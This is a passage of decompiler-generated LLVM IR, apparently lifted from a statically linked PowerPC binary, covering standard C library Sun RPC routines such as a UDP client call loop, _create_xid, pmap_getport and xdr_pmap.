  store i32 %v1_10022a5c12, i32* %r9.global-to-local, align 4
  %tmp66 = icmp ult i32 %v2_10022a28, 1000000
  br i1 %tmp66, label %dec_label_pc_10022a64, label %dec_label_pc_10022a54.lr.ph

dec_label_pc_10022a54.lr.ph:                      ; preds = %dec_label_pc_10022a5c.preheader
  %tmp67 = mul i32 %v2_10022a30, 1000000
  %tmp68 = add i32 %v2_10022a34, %v2_10022a30
  %tmp71 = sub i32 %v1_10022a5c12, %tmp67
  %v1_10022a58 = sub i32 %v2_10022a28, %tmp67
  store i32 %tmp68, i32* %r18.global-to-local, align 4
  store i32 %tmp71, i32* %r9.global-to-local, align 4
  store i32 %v1_10022a58, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_10022a64

dec_label_pc_10022a64:                            ; preds = %dec_label_pc_10022a5c.preheader.thread, %dec_label_pc_10022a54.lr.ph, %dec_label_pc_10022a5c.preheader
  %v0_10022a70 = phi i32 [ %v1_10022a58, %dec_label_pc_10022a54.lr.ph ], [ %v2_10022a28, %dec_label_pc_10022a5c.preheader ], [ %v2_10022a28, %dec_label_pc_10022a5c.preheader.thread ]
  %v0_10022a64.lcssa = phi i32 [ %tmp68, %dec_label_pc_10022a54.lr.ph ], [ %v2_10022a34, %dec_label_pc_10022a5c.preheader ], [ %v2_10022a34, %dec_label_pc_10022a5c.preheader.thread ]
  %v1_10022a64 = load i32, i32* %r21.global-to-local, align 4
  %v2_10022a64 = icmp slt i32 %v0_10022a64.lcssa, %v1_10022a64
  br i1 %v2_10022a64, label %dec_label_pc_100228f4, label %dec_label_pc_10022a6c

dec_label_pc_10022a6c:                            ; preds = %dec_label_pc_10022a64
  %v4_10022a64 = icmp eq i32 %v0_10022a64.lcssa, %v1_10022a64
  br i1 %v4_10022a64, label %dec_label_pc_10022a70, label %dec_label_pc_10022a78

dec_label_pc_10022a70:                            ; preds = %dec_label_pc_10022a6c
  %v1_10022a70 = load i32, i32* %r22.global-to-local, align 4
  %v2_10022a70 = icmp slt i32 %v0_10022a70, %v1_10022a70
  br i1 %v2_10022a70, label %dec_label_pc_100228f4, label %dec_label_pc_10022a78

dec_label_pc_10022a78:                            ; preds = %dec_label_pc_10022a6c, %dec_label_pc_10022a70, %dec_label_pc_10022920
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a80

dec_label_pc_10022a80:                            ; preds = %dec_label_pc_10022a10, %dec_label_pc_100228d0, %dec_label_pc_10022a78
  %v0_10022a80 = phi i32 [ 4, %dec_label_pc_10022a10 ], [ 1, %dec_label_pc_100228d0 ], [ 5, %dec_label_pc_10022a78 ]
  %v1_10022a80 = load i32, i32* @r30, align 4
  %v2_10022a80 = add i32 %v1_10022a80, 44
  %v3_10022a80 = inttoptr i32 %v2_10022a80 to i32*
  store i32 %v0_10022a80, i32* %v3_10022a80, align 4
  br label %dec_label_pc_10022d28

dec_label_pc_10022a88:                            ; preds = %dec_label_pc_10022958
  %v0_10022a88 = call i32 @__errno_location()
  store i32 %v0_10022a88, i32* %r3.global-to-local, align 4
  %v1_10022a8c = inttoptr i32 %v0_10022a88 to i32*
  %v2_10022a8c = load i32, i32* %v1_10022a8c, align 4
  store i32 %v2_10022a8c, i32* %r9.global-to-local, align 4
  %v3_10022a90 = icmp eq i32 %v2_10022a8c, 4
  br i1 %v3_10022a90, label %dec_label_pc_10022958, label %dec_label_pc_1002280c

dec_label_pc_10022a98:                            ; preds = %dec_label_pc_10022970
  store i32 %v1_10022a9c, i32* %r9.global-to-local, align 4
  br i1 %v3_10022a9c, label %dec_label_pc_10022bd8, label %dec_label_pc_10022aa4

dec_label_pc_10022aa4:                            ; preds = %dec_label_pc_10022a98
  %v2_10022aa4 = load i32, i32* %stack_var_-9072, align 4
  store i32 %v2_10022aa4, i32* %r9.global-to-local, align 4
  %v0_10022aa8 = load i32, i32* %r19.global-to-local, align 4
  %v1_10022aa8 = add i32 %v0_10022aa8, 286
  %v1_10022aac = call i32 @__asm_rlwinm(i32 %v1_10022aa8, i32 0, i32 0, i32 27)
  %v0_10022abc = load i32, i32* %r9.global-to-local, align 4
  %v1_10022abc = load i32, i32* @r1, align 4
  %v3_10022abc = sub i32 %v1_10022abc, %v1_10022aac
  %v4_10022abc = inttoptr i32 %v3_10022abc to i32*
  store i32 %v0_10022abc, i32* %v4_10022abc, align 4
  store i32 %v2_10022ac0, i32* %stack_var_-8900, align 4
  %v1_10022ad8 = add i32 %v3_10022abc, 23
  store i32 %v1_10022ad8, i32* %r9.global-to-local, align 4
  %v1_10022ae0 = call i32 @__asm_rlwinm(i32 %v1_10022ad8, i32 0, i32 0, i32 27)
  store i32 %v1_10022ae0, i32* %r9.global-to-local, align 4
  %v1_10022af0 = add i32 %v1_10022ae0, 256
  store i32 %v1_10022af0, i32* %r28.global-to-local, align 4
  %v0_10022b08 = load i32, i32* @r30, align 4
  %v1_10022b08 = inttoptr i32 %v0_10022b08 to i32*
  %v2_10022b08 = load i32, i32* %v1_10022b08, align 4
  store i32 %v2_10022b08, i32* %r3.global-to-local, align 4
  store i32 268577552, i32* @lr, align 4
  %v3_10022b0c = call i32 @__libc_recvmsg(i32 %v2_10022b08, i32 8192, i32 8192)
  store i32 %v3_10022b0c, i32* %r3.global-to-local, align 4
  %v1_10022b10 = icmp slt i32 %v3_10022b0c, 0
  br i1 %v1_10022b10, label %dec_label_pc_10022bd8, label %dec_label_pc_10022b18

dec_label_pc_10022b18:                            ; preds = %dec_label_pc_10022aa4
  %v0_10022b18 = load i32, i32* @r30, align 4
  %v1_10022b18 = add i32 %v0_10022b18, 88
  %v2_10022b18 = inttoptr i32 %v1_10022b18 to i32*
  %v3_10022b18 = load i32, i32* %v2_10022b18, align 4
  store i32 %v3_10022b18, i32* @r4, align 4
  %v0_10022b1c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10022b1c, i32* @r3, align 4
  %v3_10022b24 = call i32 @bcmp(i32 %v0_10022b1c, i32 %v3_10022b18, i32 %v3_10022b0c)
  store i32 %v3_10022b24, i32* %r3.global-to-local, align 4
  %v3_10022b28 = icmp eq i32 %v3_10022b24, 0
  br i1 %v3_10022b28, label %dec_label_pc_10022b30, label %dec_label_pc_10022bd8

dec_label_pc_10022b30:                            ; preds = %dec_label_pc_10022b18
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022bd8

dec_label_pc_10022bd8:                            ; preds = %dec_label_pc_10022b30, %dec_label_pc_10022b18, %dec_label_pc_10022aa4, %dec_label_pc_10022a98, %dec_label_pc_10022c08
  %v0_10022bdc = load i32, i32* @r30, align 4
  %v1_10022bdc = add i32 %v0_10022bdc, 96
  store i32 %v1_10022bdc, i32* %r28.global-to-local, align 4
  store i32 16, i32* %stack_var_-9064, align 4
  %v1_10022bf4 = add i32 %v0_10022bdc, 92
  %v2_10022bf4 = inttoptr i32 %v1_10022bf4 to i32*
  %v3_10022bf4 = load i32, i32* %v2_10022bf4, align 4
  %v1_10022bf8 = inttoptr i32 %v0_10022bdc to i32*
  %v2_10022bf8 = load i32, i32* %v1_10022bf8, align 4
  store i32 %v2_10022bf8, i32* %r3.global-to-local, align 4
  store i32 268577792, i32* @lr, align 4
  %v6_10022bfc = call i32 @__libc_recvfrom(i32 %v2_10022bf8, i32 %v1_10022bdc, i32 %v3_10022bf4, i32 0, i32 %v2_10022bec, i32 %v2_10022bf0)
  store i32 %v6_10022bfc, i32* %r3.global-to-local, align 4
  %tmp72 = icmp sgt i32 %v6_10022bfc, -1
  br i1 %tmp72, label %dec_label_pc_10022c2c, label %dec_label_pc_10022c08

dec_label_pc_10022c08:                            ; preds = %dec_label_pc_10022bd8
  %v0_10022c08 = call i32 @__errno_location()
  store i32 %v0_10022c08, i32* %r3.global-to-local, align 4
  %v1_10022c0c = inttoptr i32 %v0_10022c08 to i32*
  %v2_10022c0c = load i32, i32* %v1_10022c0c, align 4
  %v3_10022c10 = icmp eq i32 %v2_10022c0c, 4
  br i1 %v3_10022c10, label %dec_label_pc_10022bd8, label %dec_label_pc_10022c24

dec_label_pc_10022c24:                            ; preds = %dec_label_pc_10022c08
  %v0_10022c18 = call i32 @__errno_location()
  store i32 %v0_10022c18, i32* %r3.global-to-local, align 4
  %v1_10022c1c = inttoptr i32 %v0_10022c18 to i32*
  %v2_10022c1c = load i32, i32* %v1_10022c1c, align 4
  store i32 %v2_10022c1c, i32* %r9.global-to-local, align 4
  %v3_10022c20 = icmp eq i32 %v2_10022c1c, 11
  br i1 %v3_10022c20, label %dec_label_pc_10022958, label %dec_label_pc_1002280c

dec_label_pc_10022c2c:                            ; preds = %dec_label_pc_10022bd8
  %tmp73 = icmp slt i32 %v6_10022bfc, 4
  br i1 %tmp73, label %dec_label_pc_10022958, label %dec_label_pc_10022c34

dec_label_pc_10022c34:                            ; preds = %dec_label_pc_10022c2c
  %v0_10022c34 = load i32, i32* %r20.global-to-local, align 4
  %v3_10022c34 = icmp eq i32 %v0_10022c34, 0
  br i1 %v3_10022c34, label %dec_label_pc_10022c50, label %dec_label_pc_10022c3c

dec_label_pc_10022c3c:                            ; preds = %dec_label_pc_10022c34
  %v0_10022c3c = load i32, i32* @r30, align 4
  %v1_10022c3c = add i32 %v0_10022c3c, 88
  %v2_10022c3c = inttoptr i32 %v1_10022c3c to i32*
  %v3_10022c3c = load i32, i32* %v2_10022c3c, align 4
  store i32 %v3_10022c3c, i32* %r9.global-to-local, align 4
  %v1_10022c40 = add i32 %v0_10022c3c, 96
  %v2_10022c40 = inttoptr i32 %v1_10022c40 to i32*
  %v3_10022c40 = load i32, i32* %v2_10022c40, align 4
  %v1_10022c44 = inttoptr i32 %v3_10022c3c to i32*
  %v2_10022c44 = load i32, i32* %v1_10022c44, align 4
  %v4_10022c48 = icmp eq i32 %v3_10022c40, %v2_10022c44
  br i1 %v4_10022c48, label %dec_label_pc_10022c50, label %dec_label_pc_10022958

dec_label_pc_10022c50:                            ; preds = %dec_label_pc_10022c3c, %dec_label_pc_10022c34
  %v0_10022c54 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v2_10022c50, i32* %r3.global-to-local, align 4
  store i32 %v2_10022c64, i32* %r28.global-to-local, align 4
  %v5_10022c68 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-9004, i32 %v0_10022c54, i32 %v6_10022bfc, i32 1)
  store i32 %v2_10022c50, i32* %r3.global-to-local, align 4
  store i32 268577912, i32* @lr, align 4
  %v2_10022c74 = call i32 @__GI_xdr_replymsg(i32 %v2_10022c50, i32 %v2_10022c64)
  store i32 %v2_10022c74, i32* %r3.global-to-local, align 4
  %v3_10022c78 = icmp eq i32 %v2_10022c74, 0
  br i1 %v3_10022c78, label %dec_label_pc_10022d1c, label %dec_label_pc_10022c80

dec_label_pc_10022c80:                            ; preds = %dec_label_pc_10022c50
  store i32 %v2_10022c64, i32* %r3.global-to-local, align 4
  %v0_10022c84 = load i32, i32* @r30, align 4
  %v1_10022c84 = add i32 %v0_10022c84, 44
  store i32 268577932, i32* @lr, align 4
  %v2_10022c88 = inttoptr i32 %v1_10022c84 to i32*
  %v3_10022c88 = call i32 @__GI__seterr_reply(i32 %v2_10022c64, i32* %v2_10022c88)
  store i32 %v3_10022c88, i32* %r3.global-to-local, align 4
  %v0_10022c8c = load i32, i32* @r30, align 4
  %v1_10022c8c = add i32 %v0_10022c8c, 44
  %v2_10022c8c = inttoptr i32 %v1_10022c8c to i32*
  %v3_10022c8c = load i32, i32* %v2_10022c8c, align 4
  %v3_10022c90 = icmp eq i32 %v3_10022c8c, 0
  br i1 %v3_10022c90, label %dec_label_pc_10022c98, label %dec_label_pc_10022cf0

dec_label_pc_10022c98:                            ; preds = %dec_label_pc_10022c80
  %v0_10022c98 = load i32, i32* %r23.global-to-local, align 4
  %v1_10022c98 = inttoptr i32 %v0_10022c98 to i32*
  %v2_10022c98 = load i32, i32* %v1_10022c98, align 4
  store i32 %v2_10022c98, i32* %r3.global-to-local, align 4
  %v1_10022ca4 = add i32 %v2_10022c98, 32
  %v2_10022ca4 = inttoptr i32 %v1_10022ca4 to i32*
  %v3_10022ca4 = load i32, i32* %v2_10022ca4, align 4
  store i32 %v3_10022ca4, i32* %r9.global-to-local, align 4
  %v1_10022ca8 = add i32 %v3_10022ca4, 8
  %v2_10022ca8 = inttoptr i32 %v1_10022ca8 to i32*
  %v3_10022ca8 = load i32, i32* %v2_10022ca8, align 4
  store i32 %v3_10022ca8, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022ca8)
  %v0_10022cb4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10022cb4 = icmp eq i32 %v0_10022cb4, 0
  br i1 %v3_10022cb4, label %dec_label_pc_10022cbc, label %dec_label_pc_10022ccc

dec_label_pc_10022cbc:                            ; preds = %dec_label_pc_10022c98
  %v1_10022cc0 = load i32, i32* @r30, align 4
  %v2_10022cc0 = add i32 %v1_10022cc0, 44
  %v3_10022cc0 = inttoptr i32 %v2_10022cc0 to i32*
  store i32 7, i32* %v3_10022cc0, align 4
  %v1_10022cc8 = load i32, i32* @r30, align 4
  %v2_10022cc8 = add i32 %v1_10022cc8, 48
  %v3_10022cc8 = inttoptr i32 %v2_10022cc8 to i32*
  store i32 6, i32* %v3_10022cc8, align 4
  br label %dec_label_pc_10022ccc

dec_label_pc_10022ccc:                            ; preds = %dec_label_pc_10022c98, %dec_label_pc_10022cbc
  %v3_10022cd0 = icmp eq i32 %tmp33, 0
  br i1 %v3_10022cd0, label %dec_label_pc_10022d24, label %dec_label_pc_10022cd8

dec_label_pc_10022cd8:                            ; preds = %dec_label_pc_10022ccc
  %v0_10022cdc = load i32, i32* @r26, align 4
  store i32 %v0_10022cdc, i32* @r3, align 4
  %v2_10022ce0 = inttoptr i32 %v0_10022cdc to i32*
  store i32 2, i32* %v2_10022ce0, align 4
  store i32 %v2_1002292c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10022cec.1301 to i32), i32* @lr, align 4
  %v0_10022ce8 = call i32 @xdr_opaque_auth()
  store i32 %v0_10022ce8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022d24

dec_label_pc_10022cf0:                            ; preds = %dec_label_pc_10022c80
  %v0_10022cf0 = load i32, i32* %r17.global-to-local, align 4
  %tmp74 = icmp slt i32 %v0_10022cf0, 1
  br i1 %tmp74, label %dec_label_pc_10022d24, label %dec_label_pc_10022cf8

dec_label_pc_10022cf8:                            ; preds = %dec_label_pc_10022cf0
  %v0_10022cf8 = load i32, i32* %r23.global-to-local, align 4
  %v1_10022cf8 = inttoptr i32 %v0_10022cf8 to i32*
  %v2_10022cf8 = load i32, i32* %v1_10022cf8, align 4
  store i32 %v2_10022cf8, i32* %r3.global-to-local, align 4
  %v1_10022cfc = add i32 %v2_10022cf8, 32
  %v2_10022cfc = inttoptr i32 %v1_10022cfc to i32*
  %v3_10022cfc = load i32, i32* %v2_10022cfc, align 4
  store i32 %v3_10022cfc, i32* %r9.global-to-local, align 4
  %v1_10022d00 = add i32 %v3_10022cfc, 12
  %v2_10022d00 = inttoptr i32 %v1_10022d00 to i32*
  %v3_10022d00 = load i32, i32* %v2_10022d00, align 4
  store i32 %v3_10022d00, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022d00)
  %v0_10022d0c = load i32, i32* %r3.global-to-local, align 4
  %v3_10022d0c = icmp eq i32 %v0_10022d0c, 0
  br i1 %v3_10022d0c, label %dec_label_pc_10022d24, label %dec_label_pc_10022d14

dec_label_pc_10022d14:                            ; preds = %dec_label_pc_10022cf8
  %v0_10022d14 = load i32, i32* %r17.global-to-local, align 4
  %v1_10022d14 = add i32 %v0_10022d14, -1
  store i32 %v1_10022d14, i32* %r17.global-to-local, align 4
  %v0_10022838.pre = load i32, i32* %r20.global-to-local, align 4
  %v0_1002283c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10022838

dec_label_pc_10022d1c:                            ; preds = %dec_label_pc_10022c50
  %v1_10022d20 = load i32, i32* @r30, align 4
  %v2_10022d20 = add i32 %v1_10022d20, 44
  %v3_10022d20 = inttoptr i32 %v2_10022d20 to i32*
  store i32 2, i32* %v3_10022d20, align 4
  br label %dec_label_pc_10022d24

dec_label_pc_10022d24:                            ; preds = %dec_label_pc_10022cf8, %dec_label_pc_10022cf0, %dec_label_pc_10022ccc, %dec_label_pc_10022cd8, %dec_label_pc_10022d1c
  %v0_10022d24 = load i32, i32* @r30, align 4
  %v1_10022d24 = add i32 %v0_10022d24, 44
  %v2_10022d24 = inttoptr i32 %v1_10022d24 to i32*
  %v3_10022d24 = load i32, i32* %v2_10022d24, align 4
  store i32 %v3_10022d24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022d28

dec_label_pc_10022d28:                            ; preds = %dec_label_pc_10022a80, %dec_label_pc_10022814, %dec_label_pc_10022d24
  %v0_10022d3c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10022d3c

; uselistorder directives
  uselistorder i32 %v0_10022bdc, { 1, 0, 2 }
  uselistorder i32 %v0_10022a64.lcssa, { 1, 0 }
  uselistorder i32 %v1_10022a58, { 1, 0 }
  uselistorder i32 %v2_10022a34, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10022a28, { 2, 3, 0, 1, 5, 4, 6, 7, 8 }
  uselistorder i32 %v0_10022a1c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100229f4.pre, { 1, 0 }
  uselistorder i32 %v0_10022904, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10022c64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10022c50, { 1, 0, 2 }
  uselistorder i32 %v1_10022a9c, { 1, 0 }
  uselistorder i32 %v3_100227bc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 35, 34, 33, 14, 15, 16, 17, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 19, 20, 31, 32, 0 }
  uselistorder i32* %r3.global-to-local, { 32, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 0, 27, 41, 1 }
  uselistorder i32* %r24.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r22.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r19.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r18.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8192, { 1, 0, 2, 3 }
  uselistorder i32 -983040, { 1, 0 }
  uselistorder i32 1000000, { 2, 0, 1, 3, 4 }
  uselistorder i32 8800, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 2, 3, 4, 5, 11, 12, 1, 13, 10, 6, 7, 8, 9, 0 }
  uselistorder i32 1000, { 2, 0, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder label %dec_label_pc_10022d28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10022d24, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10022ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10022bd8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10022a80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10022a78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10022a64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10022a10, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_100229f0, { 1, 0 }
  uselistorder label %dec_label_pc_100229bc, { 1, 0 }
  uselistorder label %dec_label_pc_10022958, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10022928, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10022828, { 1, 0 }
  uselistorder label %dec_label_pc_10022814, { 1, 0 }
  uselistorder label %dec_label_pc_1002280c, { 1, 0 }
}

define i32 @_create_xid(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_10022d5c = ptrtoint i32* %stack_var_-44 to i32
  %v4_10022d6c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 268527832, i32 ptrtoint (i32* @global_var_1004daf8.1302 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268578172, i32* @lr, align 4
  %v1_10022d78 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004daf8.1302 to i32))
  %v3_10022d7c = load i32, i32* @global_var_1004524c.1303, align 4
  %v3_10022d88 = icmp eq i32 %v3_10022d7c, 0
  br i1 %v3_10022d88, label %dec_label_pc_10022d90, label %dec_label_pc_10022db4

dec_label_pc_10022d90:                            ; preds = %entry
  %v2_10022d84 = ptrtoint i32* %stack_var_-52 to i32
  store i32 268578196, i32* @lr, align 4
  %v2_10022d90 = call i32 @gettimeofday(i32 %v2_10022d84, i32 0)
  %v3_10022d94 = load i32, i32* %stack_var_-52, align 4
  %v2_10022da4 = xor i32 %v3_10022d94, %tmp
  %v2_10022da8 = trunc i32 %v2_10022da4 to i16
  %v3_10022da8 = call i32 @__GI_srand48_r(i16 %v2_10022da8, i32 ptrtoint (i32* @global_var_1004db10.1304 to i32))
  store i32 1, i32* @global_var_1004524c.1303, align 4
  br label %dec_label_pc_10022db4

dec_label_pc_10022db4:                            ; preds = %entry, %dec_label_pc_10022d90
  %v2_10022db8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268578244, i32* @lr, align 4
  %v2_10022dc0 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_1004db10.1304 to i32), i32 %v2_10022db8)
  store i32 %v2_10022d5c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268578256, i32* @lr, align 4
  %v0_10022dcc = call i32 @__pthread_cleanup_pop_restore()
  %v3_10022dd4 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10022dd4

; uselistorder directives
  uselistorder label %dec_label_pc_10022db4, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i16, align 2
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 400, i32* @r8, align 4
  %v3_10022e0c = add i32 %arg1, 2
  %v4_10022e0c = inttoptr i32 %v3_10022e0c to i16*
  store i16 111, i16* %v4_10022e0c, align 2
  %v2_10022e10 = ptrtoint i32* %stack_var_-40 to i32
  store i16 0, i16* %stack_var_-72, align 2
  store i32 %v2_10022e10, i32* @r6, align 4
  %v2_10022e3c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10022e3c, i32* @r7, align 4
  store i32 400, i32* @r9, align 4
  store i32 %arg1, i32* @r26, align 4
  store i32 -1, i32* %stack_var_-68, align 4
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268578396, i32* @lr, align 4
  %v6_10022e58 = call i32 @__GI_clntudp_bufcreate(i32 100000, i32 2, i32 %v2_10022e10)
  store i32 %v6_10022e58, i32* %r3.global-to-local, align 4
  store i32 %v6_10022e58, i32* @r31, align 4
  %v3_10022e5c = icmp eq i32 %v6_10022e58, 0
  br i1 %v3_10022e5c, label %dec_label_pc_10022f20, label %dec_label_pc_10022e64

dec_label_pc_10022e64:                            ; preds = %entry
  store i32 268578408, i32* @lr, align 4
  %v0_10022e64 = call i32 @__GI___rpc_thread_createerr()
  store i32 0, i32* @r10, align 4
  store i32 %v0_10022e64, i32* @r30, align 4
  store i32 60, i32* %stack_var_-40, align 4
  %v2_10022eb4 = ptrtoint i16* %stack_var_-72 to i32
  store i32 %v2_10022eb4, i32* @r8, align 4
  %v0_10022eb8 = load i32, i32* @r31, align 4
  store i32 %v0_10022eb8, i32* %r3.global-to-local, align 4
  %v1_10022ebc = add i32 %v0_10022eb8, 4
  %v2_10022ebc = inttoptr i32 %v1_10022ebc to i32*
  %v3_10022ebc = load i32, i32* %v2_10022ebc, align 4
  %v1_10022ec0 = inttoptr i32 %v3_10022ebc to i32*
  %v2_10022ec0 = load i32, i32* %v1_10022ec0, align 4
  call void @__pseudo_call(i32 %v2_10022ec0)
  %v0_10022ecc = load i32, i32* @r30, align 4
  %v0_10022ed0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10022ed0 = icmp eq i32 %v0_10022ed0, 0
  %v0_10022ed4 = load i32, i32* @r31, align 4
  store i32 %v0_10022ed4, i32* %r3.global-to-local, align 4
  br i1 %v3_10022ed0, label %dec_label_pc_10022ef8, label %dec_label_pc_10022edc

dec_label_pc_10022edc:                            ; preds = %dec_label_pc_10022e64
  %v2_10022ee0 = inttoptr i32 %v0_10022ecc to i32*
  store i32 14, i32* %v2_10022ee0, align 4
  %v0_10022ee4 = load i32, i32* @r31, align 4
  %v1_10022ee4 = add i32 %v0_10022ee4, 4
  %v2_10022ee4 = inttoptr i32 %v1_10022ee4 to i32*
  %v3_10022ee4 = load i32, i32* %v2_10022ee4, align 4
  %v1_10022ee8 = add i32 %v3_10022ee4, 8
  %v2_10022ee8 = inttoptr i32 %v1_10022ee8 to i32*
  %v3_10022ee8 = load i32, i32* %v2_10022ee8, align 4
  call void @__pseudo_call(i32 %v3_10022ee8)
  br label %dec_label_pc_10022f0c

dec_label_pc_10022ef8:                            ; preds = %dec_label_pc_10022e64
  %v3_10022ef8 = load i16, i16* %stack_var_-72, align 2
  %v3_10022efc = icmp eq i16 %v3_10022ef8, 0
  br i1 %v3_10022efc, label %dec_label_pc_10022f04, label %dec_label_pc_10022f0c

dec_label_pc_10022f04:                            ; preds = %dec_label_pc_10022ef8
  %v2_10022f08 = inttoptr i32 %v0_10022ecc to i32*
  store i32 15, i32* %v2_10022f08, align 4
  br label %dec_label_pc_10022f0c

dec_label_pc_10022f0c:                            ; preds = %dec_label_pc_10022ef8, %dec_label_pc_10022edc, %dec_label_pc_10022f04
  %v0_10022f0c = load i32, i32* @r31, align 4
  %v1_10022f0c = add i32 %v0_10022f0c, 4
  %v2_10022f0c = inttoptr i32 %v1_10022f0c to i32*
  %v3_10022f0c = load i32, i32* %v2_10022f0c, align 4
  store i32 %v0_10022f0c, i32* %r3.global-to-local, align 4
  %v1_10022f14 = add i32 %v3_10022f0c, 16
  %v2_10022f14 = inttoptr i32 %v1_10022f14 to i32*
  %v3_10022f14 = load i32, i32* %v2_10022f14, align 4
  call void @__pseudo_call(i32 %v3_10022f14)
  %v3_10022f24.pre = load i16, i16* %stack_var_-72, align 2
  %phitmp = sext i16 %v3_10022f24.pre to i32
  br label %dec_label_pc_10022f20

dec_label_pc_10022f20:                            ; preds = %entry, %dec_label_pc_10022f0c
  %v3_10022f24 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_10022f0c ]
  store i32 %v3_10022f24, i32* %r3.global-to-local, align 4
  %v2_10022f28 = load i32, i32* @r26, align 4
  %v3_10022f28 = add i32 %v2_10022f28, 2
  %v4_10022f28 = inttoptr i32 %v3_10022f28 to i16*
  store i16 0, i16* %v4_10022f28, align 2
  ret i32 %v3_10022f24

; uselistorder directives
  uselistorder i32 %v3_10022f24, { 1, 0 }
  uselistorder i16* %stack_var_-72, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_10022f20, { 1, 0 }
  uselistorder label %dec_label_pc_10022f0c, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10022f44 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 268578652, i32* @lr, align 4
  %v0_10022f58 = call i32 @xdr_u_long()
  %v0_10022f5c = load i32, i32* @r31, align 4
  %v1_10022f5c = add i32 %v0_10022f5c, 4
  store i32 %v1_10022f5c, i32* @r4, align 4
  %v3_10022f60 = icmp eq i32 %v0_10022f58, 0
  %v0_10022f64 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f64, i32* @r3, align 4
  br i1 %v3_10022f60, label %dec_label_pc_10022fa8, label %dec_label_pc_10022f6c

dec_label_pc_10022f6c:                            ; preds = %entry
  store i32 268578672, i32* @lr, align 4
  %v0_10022f6c = call i32 @xdr_u_long()
  %v0_10022f70 = load i32, i32* @r31, align 4
  %v1_10022f70 = add i32 %v0_10022f70, 8
  store i32 %v1_10022f70, i32* @r4, align 4
  %v3_10022f74 = icmp eq i32 %v0_10022f6c, 0
  %v0_10022f78 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10022f78, i32* @r3, align 4
  br i1 %v3_10022f74, label %dec_label_pc_10022fa8, label %dec_label_pc_10022f80

dec_label_pc_10022f80:                            ; preds = %dec_label_pc_10022f6c
  store i32 268578692, i32* @lr, align 4
  %v0_10022f80 = call i32 @xdr_u_long()
